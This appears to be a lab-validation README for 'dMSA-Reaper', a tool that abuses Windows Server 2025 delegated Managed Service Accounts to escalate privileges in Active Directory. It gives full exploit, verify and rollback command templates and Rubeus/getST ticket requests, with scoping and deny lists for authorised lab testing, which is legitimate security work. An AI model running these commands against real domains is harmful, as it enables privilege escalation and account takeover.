# dMSA-Reaper Lab Validation

This project is not mission-ready until at least one full Windows Server 2025
lab run is documented:

```text
map -> paths -> exploit --dry-run -> exploit --confirm -> verify --mode ldap
-> rollback -> verify rollback
```

LDAP-state verification is not Kerberos verification. External Kerberos tooling
may be recorded with `verify --mode external`, but native Kerberos validation is
not implemented in this task.

## Baseline Requirements

| Requirement | Expected evidence |
|---|---|
| dMSA schema present | `dmsa_schema_status=present` in map output |
| Server 2025 DC present | `server_2025_dc_status=present` and at least one DC classified Server 2025 |
| KDS root key present | `kds_root_key_status=present` |
| dMSA capable | `dmsa_capable_status=present` only when all three prerequisites are present |
| Scope file | allowed OUs/targets and denySubtrees reviewed before writes |
| Operation log | `OP-YYYYMMDD-xxxxxxxx.json` created before first LDAP write |
| Rollback | target attrs restored and created or maybe-created dMSA absent |

## Scenario Matrix

For every scenario, record setup, expected `map`, expected `paths`, dry-run
command, exploit command if safe, verify command, rollback command, and expected
LDAP/event artifacts.

| Scenario | Setup | Expected map | Expected paths | Safe exploit? |
|---|---|---|---|---|
| Server 2025 DC + KDS root key present | WS2025 DC, dMSA schema, `Add-KdsRootKey` completed | all prerequisite statuses `present` | postpatch paths can be emitted when rights exist | yes, with scope and `--confirm` |
| Server 2025 DC + no KDS root key | Remove or omit KDS root key in isolated lab | `kds_root_key_status=absent`, `dmsa_capable_status=absent` | no direct dMSA-capable path claims | no, except explicit lab override |
| KDS query unreadable/failing | Deny read or simulate LDAP error | `kds_root_key_status=unknown`, `dmsa_capable_status=unknown` | no confident dMSA-capable claim | no, except explicit lab override |
| Patched KDC behavior | Current patched Server 2025 KDC | LDAP writes may verify | postpatch-mutual-pair is primary | yes; Kerberos result must be external |
| Legacy/pre-patch lab | Isolated legacy/CTF KDC behavior | mark as lab-only | `legacy-oneway-link` only with flag | only with `--allow-legacy-oneway-link` |
| Nested group right | Operator receives rights through nested group | principal SID set includes nested group | rights flow to paths | yes if scoped |
| Deny ACE override | Deny WriteProperty/CreateChild before allow | map should not overclaim denied right | blocked or no path | no |
| Inherited ACE | Parent grants inherited CreateChild/WriteProperty | inherited right appears with source | path emitted if effective | yes if scoped |
| Owner-only WriteDACL | Operator owns object, no explicit WriteDACL | owner-implied WriteDACL path visible | DACL path low confidence | only with DACL gates |
| Target-side attrs writable | Target grants both superseded attrs | writable attrs include both names | postpatch path emitted | yes |
| dMSA-side attrs writable | Existing dMSA grants required attrs | dMSA rights include explicit attrs | existing-dmsa-legacy-link path emitted; postpatch path requires target attrs too | legacy only with explicit flag |
| LDAPS required | DC requires LDAP signing/LDAPS | LDAPS bind succeeds when `--use-ldaps` is passed | no path change | use `--use-ldaps` |
| LDAP signing/channel binding enforced | Enforce policy on DC | signing/channel binding statuses remain `unknown` placeholders | no path change | bind method must satisfy policy |
| Rollback after partial failure | Force target-side modify failure after create | operation `partial-failed` before rollback | rollback has created/maybe-created cleanup | verify rollback before success claim |

## Command Template

```bash
dmsa-reaper map --domain dmsalab.local --dc-ip 10.0.0.10 \
  -u analyst -p 'TestPass123!' --use-ldaps --json state.json

dmsa-reaper paths --state state.json --expand-targets --json paths.json

dmsa-reaper exploit --paths paths.json --path P-0001 \
  --domain dmsalab.local --dc-ip 10.0.0.10 \
  -u analyst -p 'TestPass123!' \
  --scope scope.json --dry-run

dmsa-reaper exploit --paths paths.json --path P-0001 \
  --domain dmsalab.local --dc-ip 10.0.0.10 \
  -u analyst -p 'TestPass123!' \
  --scope scope.json --confirm

dmsa-reaper verify --op OP-YYYYMMDD-xxxxxxxx --mode ldap \
  --domain dmsalab.local --dc-ip 10.0.0.10 \
  -u analyst -p 'TestPass123!'

dmsa-reaper rollback --op OP-YYYYMMDD-xxxxxxxx \
  --domain dmsalab.local --dc-ip 10.0.0.10 \
  -u analyst -p 'TestPass123!'
```

## Scope Template

```json
{
  "domain": "dmsalab.local",
  "allowedOUs": ["OU=Reaper,DC=dmsalab,DC=local"],
  "allowedTargets": ["OU=Targets,OU=Reaper,DC=dmsalab,DC=local"],
  "denyTargets": [
    "CN=krbtgt,CN=Users,DC=dmsalab,DC=local",
    "CN=Administrator,CN=Users,DC=dmsalab,DC=local"
  ],
  "denySubtrees": [
    "OU=Tier0,DC=dmsalab,DC=local"
  ],
  "allowDaclPrimitives": false,
  "allowBroadDacl": false,
  "requireConfirmString": true
}
```

## Evidence To Record

| Step | Evidence |
|---|---|
| Map | state JSON, prerequisite statuses, DC OS/version |
| Paths | selected path ID, required rights, confidence |
| Dry-run | planned DN, exact attributes, rollback plan |
| Exploit | operation ID, created/maybe-created DNs, changed attrs |
| LDAP verify | explicit LDAP-state limitation and result |
| External verify | argv, stdout/stderr, exit code if used |
| Rollback | restored attrs, deleted dMSA, rollback verification result |

## Kerberos Verification Boundary

LDAP-state verify confirms attribute values only. It does **not** prove that
a KDC will issue a ticket that inherits the target PAC.

External Kerberos verification is the only proof beyond LDAP state.
Record external verifier argv, exit code, and stdout/stderr SHA-256 hashes
using `dmsa-reaper verify --mode external`.

For Exegol-specific cache, DNS, SMB, and clock-skew observations from the
current lab, see [EXEGOL_KERBEROS_NOTES.md](EXEGOL_KERBEROS_NOTES.md).

Failure classes used in JSON output:

- `kerberos-dmsa-proof-failed`
- `kerberos-tooling-inconclusive`
- `kerberos-base-ok-dmsa-unknown`
- `kerberos-clock-skew`
- `kerberos-dns-resolution`
- `kerberos-cache-format`

### Windows / Rubeus example

```powershell
# Request a service ticket using the dMSA account to confirm PAC inheritance.
# Replace <dmsa-sam>$ with the sAMAccountName from exploit output.
# Prerequisite: run from a host with access to the DC on port 88.
Rubeus.exe asktgt /user:<dmsa-sam>$ /domain:dmsalab.local /dc:10.0.0.10 /nowrap
```

Record with dmsa-reaper:
```bash
dmsa-reaper verify --op OP-YYYYMMDD-xxxxxxxx --mode external \
  --external-argv Rubeus.exe asktgt /user:dmsarpr-abcd1234$ \
    /domain:dmsalab.local /dc:10.0.0.10 /nowrap \
  --domain dmsalab.local --dc-ip 10.0.0.10 \
  -u analyst -p 'TestPass123!'
```

### Linux / impacket placeholder

Native Kerberos verification via impacket is not currently supported.
The `getST.py` workflow does not confirm PAC inheritance semantics without
additional ticket inspection tooling.  Use Rubeus (on Windows) or wait for
a future `--mode kerberos` implementation.

If your lab uses a Linux-accessible KDC:
```bash
# Placeholder only — exit code from getST.py does not confirm PAC origin.
# External verification must prove the dMSA account obtains a ticket whose
# PAC reflects the target's group membership, not just ticket issuance.
getST.py -dc-ip 10.0.0.10 -spn cifs/dc01.dmsalab.local dmsalab.local/<dmsa-sam>
```

Record the result and mark external_kerberos_verify_success=true in the
checklist only after inspecting the PAC or confirming access that proves it.

## Known Gaps

- No native Kerberos dMSA verification — use external verifier.
- No KDS/golden dMSA extraction.
- No executable self-pkinit-loop/Ouroboros primitive.
- ACL effective-rights results still need full lab-matrix validation.
- SACL retrieval is optional and must be recorded as unreadable/unknown on
  failure, not as false.
- LDAP signing and channel binding status fields are placeholders until active
  checks are implemented.
